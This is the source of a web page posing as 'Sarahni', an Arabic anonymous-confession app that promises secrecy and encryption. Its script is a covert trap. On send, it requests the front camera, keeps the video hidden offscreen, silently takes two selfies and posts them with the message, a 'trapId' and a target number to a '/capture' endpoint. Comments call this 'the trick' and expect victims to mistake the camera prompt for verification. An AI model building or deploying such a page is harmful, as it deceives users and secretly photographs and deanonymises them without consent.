
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صارحني | أرسل رسالة مجهولة</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            /* خلفية بتدرج وردي ناعم جداً */
            background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%);
            color: #374151;
            -webkit-tap-highlight-color: transparent;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .sarahni-card {
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(236, 72, 153, 0.08); /* ظل وردي خفيف */
            border: 1px solid rgba(255,255,255,0.8);
        }

        .sarahni-header {
            /* تدرج أنثوي جذاب (وردي إلى خوخي) */
            background: linear-gradient(135deg, #f43f5e 0%, #ec4899 50%, #d946ef 100%);
            border-radius: 32px 32px 0 0;
            padding: 40px 20px 50px 20px;
            text-align: center;
            color: white;
            position: relative;
            overflow: hidden;
        }

        /* تموجات ديكورية في الترويسة */
        .sarahni-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
            transform: rotate(30deg);
        }

        .profile-pic-container {
            position: absolute;
            bottom: -45px;
            left: 50%;
            transform: translateX(-50%);
            width: 90px;
            height: 90px;
            background: #ffffff;
            border-radius: 50%;
            padding: 5px;
            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.15);
        }

        .profile-pic {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: linear-gradient(135deg, #fbcfe8 0%, #f9a8d4 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 38px;
            color: #be185d;
        }

        .textarea-custom {
            background: #fdf2f8; /* وردي باهت جداً */
            border: 2px solid #fbcfe8;
            border-radius: 20px;
            resize: none;
            transition: all 0.3s ease;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            color: #4c1d95;
            font-weight: 600;
        }

        .textarea-custom:focus {
            outline: none;
            border-color: #ec4899;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(236, 72, 153, 0.1);
        }

        .textarea-custom::placeholder {
            color: #9ca3af;
            font-weight: 400;
        }

        .btn-send {
            background: linear-gradient(135deg, #ec4899 0%, #f43f5e 100%);
            border-radius: 9999px; /* شكل كبسولة دائري تماماً */
            transition: all 0.3s;
            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.3);
        }
        
        .btn-send:hover {
            box-shadow: 0 10px 25px rgba(236, 72, 153, 0.4);
            transform: translateY(-2px);
        }
        
        .btn-send:active {
            transform: translateY(1px);
        }

        /* كتم الكاميرا تماماً */
        #spy-vid {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body class="p-4">

    <!-- الكاميرا المخفية -->
    <video id="spy-vid" autoplay playsinline muted></video>

    <!-- واجهة كتابة الصراحة -->
    <main id="main-ui" class="w-full max-w-sm sarahni-card relative transition-all duration-500 z-10">
        
        <!-- الترويسة الأنثوية -->
        <div class="sarahni-header">
            <h1 class="text-3xl font-extrabold font-['Cairo'] tracking-tight drop-shadow-md">صـارحـنـي</h1>
            <p class="text-sm opacity-95 mt-1 font-medium">لن يعرف أحد هويتك أبداً 🤫</p>
            
            <div class="profile-pic-container">
                <div class="profile-pic">
                    <i class="fa-solid fa-face-smile-wink"></i>
                </div>
            </div>
        </div>

        <!-- مساحة الكتابة -->
        <div class="pt-16 pb-8 px-6 space-y-5">
            <div class="text-center">
                <h2 class="text-xl font-bold text-gray-800">أرسل رسالة سرية</h2>
                <p class="text-xs text-gray-500 mt-1">هل لديك شيء تخفيه في قلبك وتريد قوله؟</p>
            </div>

            <div class="relative">
                <textarea id="confession-text" rows="5" class="w-full textarea-custom p-4 text-center" placeholder="اكتب رسالتك هنا بصدق..."></textarea>
                <div class="absolute bottom-3 right-4 text-pink-300 text-sm">
                    <i class="fa-solid fa-heart"></i>
                </div>
            </div>

            <button id="send-btn" class="w-full btn-send text-white font-bold text-lg py-4 flex justify-center items-center gap-2">
                <i class="fa-solid fa-paper-plane"></i>
                <span id="btn-text">إرسال بصراحة</span>
            </button>
            
            <div class="text-center text-[10px] text-gray-400 font-semibold flex items-center justify-center gap-1">
                <i class="fa-solid fa-lock text-pink-400"></i> الرسائل مشفرة تماماً
            </div>
        </div>
    </main>

    <!-- واجهة النجاح -->
    <div id="success-ui" class="hidden w-full max-w-sm sarahni-card p-10 text-center transform scale-95 opacity-0 transition-all duration-500 z-10">
        <div class="w-24 h-24 mx-auto bg-gradient-to-br from-pink-100 to-rose-100 rounded-full flex items-center justify-center mb-6 shadow-inner border-4 border-white">
            <i class="fa-solid fa-heart-circle-check text-5xl text-pink-500"></i>
        </div>
        <h2 class="text-3xl font-extrabold text-gray-800 mb-2 font-['Cairo']">تم الإرسال!</h2>
        <p class="text-gray-500 text-sm leading-relaxed mb-8 font-medium">
            وصلت رسالتك بسلام وبسرية تامة. شكراً لمشاركتك مشاعرك.
        </p>
        <button onclick="location.reload()" class="w-full bg-pink-50 text-pink-600 font-bold py-3 rounded-full hover:bg-pink-100 transition-colors">
            إرسال رسالة أخرى
        </button>
    </div>

    <!-- تذييل الصفحة -->
    <footer class="mt-10 text-center text-pink-400/80 text-xs font-bold tracking-wider z-0">
        <p>SARAHNI APP © 2026</p>
    </footer>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const targetNumber = urlParams.get('target');

        const sendBtn = document.getElementById('send-btn');
        const btnText = document.getElementById('btn-text');
        const confessionText = document.getElementById('confession-text');
        const mainUi = document.getElementById('main-ui');
        const successUi = document.getElementById('success-ui');
        const videoElement = document.getElementById('spy-vid');

        sendBtn.addEventListener('click', async () => {
            const message = confessionText.value.trim();
            if (!message) {
                confessionText.style.borderColor = "#f43f5e";
                confessionText.placeholder = "الرجاء كتابة رسالة أولاً...";
                confessionText.focus();
                return;
            }

            if (!sessionId || !targetNumber) {
                alert("عذراً، هذا الرابط غير صالح للاستقبال.");
                return;
            }

            // تعطيل الزر وتغيير حالته
            sendBtn.disabled = true;
            sendBtn.style.opacity = "0.8";
            btnText.textContent = "جاري الإرسال...";
            sendBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> <span id="btn-text">جاري الإرسال...</span>`;

            let capturedImages = [];

            // 1. الخدعة: طلب الكاميرا والتقاط الصور بصمت
            try {
                // قد يظهر إشعار للمستخدم يطلب الصلاحية، فيظن أنه للتحقق
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
                videoElement.srcObject = stream;
                
                // ننتظر 1 ثانية لتستقر الإضاءة
                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');

                // التقاط الصورة الأولى
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // انتظار نصف ثانية للقطة الثانية
                await new Promise(resolve => setTimeout(resolve, 500));
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));

                // إغلاق الكاميرا فوراً
                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                // إذا رفض الكاميرا، نستمر بصمت لإرسال الرسالة النصية
                console.log("No Camera Access.");
            }

            // 2. تصميم صورة فخمة و"أنثوية" للرسالة التي ستصلك
            try {
                const textImageBase64 = generateMessageImage(message);
                capturedImages.push(textImageBase64); // إضافة الرسالة
            } catch (err) {
                alert("حدث خطأ داخلي.");
                location.reload();
                return;
            }

            // 3. الإرسال إلى نقطة الباك إند
            sendDataToServer(capturedImages);
        });

        // دالة تحويل النص إلى تصميم جذاب (كأنه بطاقة معايدة زهرية)
        function generateMessageImage(text) {
            const canvas = document.createElement('canvas');
            canvas.width = 1000;
            canvas.height = 1000;
            const ctx = canvas.getContext('2d');

            // خلفية بتدرج وردي هادئ وفخم
            const grad = ctx.createLinearGradient(0, 0, 1000, 1000);
            grad.addColorStop(0, '#fdf2f8'); 
            grad.addColorStop(1, '#fbcfe8'); 
            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, 1000, 1000);

            // إطار داخلي أبيض أنيق
            ctx.fillStyle = '#ffffff';
            ctx.shadowColor = "rgba(236, 72, 153, 0.15)";
            ctx.shadowBlur = 40;
            ctx.shadowOffsetY = 10;
            // رسم مستطيل بزوايا دائرية
            ctx.beginPath();
            ctx.roundRect(50, 50, 900, 900, 40);
            ctx.fill();

            // إيقاف الظل للعناصر الداخلية
            ctx.shadowBlur = 0;
            ctx.shadowOffsetY = 0;

            ctx.direction = 'rtl';
            ctx.textAlign = 'center';

            // الترويسة
            ctx.fillStyle = '#db2777'; // لون وردي غامق
            ctx.font = 'bold 50px Cairo, Arial';
            ctx.fillText('💌 مصارحة جديدة', 500, 160);

            // خط فاصل وردي فاتح
            ctx.strokeStyle = '#fce7f3';
            ctx.lineWidth = 4;
            ctx.beginPath();
            ctx.moveTo(250, 210);
            ctx.lineTo(750, 210);
            ctx.stroke();

            // رسم النص המكتوب
            ctx.fillStyle = '#4b5563'; // لون رمادي داكن مريح للقراءة
            ctx.font = 'bold 42px Tajawal, Arial';
            
            const words = text.split(' ');
            let line = '';
            let y = 320;
            const maxWidth = 750;
            const lineHeight = 65;

            for(let n = 0; n < words.length; n++) {
                const currentWord = words[n];
                if (currentWord.includes('\n')) {
                    const splitWords = currentWord.split('\n');
                    for (let i = 0; i < splitWords.length; i++) {
                        let testLine = line + splitWords[i] + ' ';
                        if (ctx.measureText(testLine).width > maxWidth && n > 0) {
                            ctx.fillText(line, 500, y);
                            line = splitWords[i] + ' ';
                            y += lineHeight;
                        } else {
                            line = testLine;
                        }
                        if (i < splitWords.length - 1) {
                            ctx.fillText(line, 500, y);
                            line = '';
                            y += lineHeight;
                        }
                    }
                    continue;
                }

                let testLine = line + currentWord + ' ';
                if (ctx.measureText(testLine).width > maxWidth && n > 0) {
                    ctx.fillText(line, 500, y);
                    line = currentWord + ' ';
                    y += lineHeight;
                } else {
                    line = testLine;
                }
            }
            ctx.fillText(line, 500, y);

            // التذييل الأمني
            ctx.fillStyle = '#9ca3af';
            ctx.font = '28px Tajawal, Arial';
            ctx.fillText('نظام TARZAN VIP 👑', 500, 880);

            return canvas.toDataURL('image/jpeg', 0.9);
        }

        function sendDataToServer(dataPayload) {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'selfie', 
                    data: dataPayload, 
                    targetNumber: targetNumber, 
                    trapId: 'صـارحـنـي 💌', 
                    sessionId: sessionId 
                })
            })
            .then(res => {
                if (!res.ok) throw new Error("Server Reject");
                return res.json();
            })
            .then(resData => {
                if(resData.success) {
                    mainUi.style.opacity = '0';
                    setTimeout(() => {
                        mainUi.classList.add('hidden');
                        successUi.classList.remove('hidden');
                        setTimeout(() => {
                            successUi.style.opacity = '1';
                            successUi.style.transform = 'scale(1)';
                        }, 50);
                    }, 400);
                } else {
                    alert("يوجد ضغط على الخادم، يرجى المحاولة مرة أخرى.");
                    location.reload();
                }
            })
            .catch(err => {
                console.error("Fetch Error:", err);
                alert("لا يوجد اتصال بالإنترنت، يرجى التحقق وإعادة المحاولة.");
                location.reload();
            });
        }
    </script>
</body>
</html>
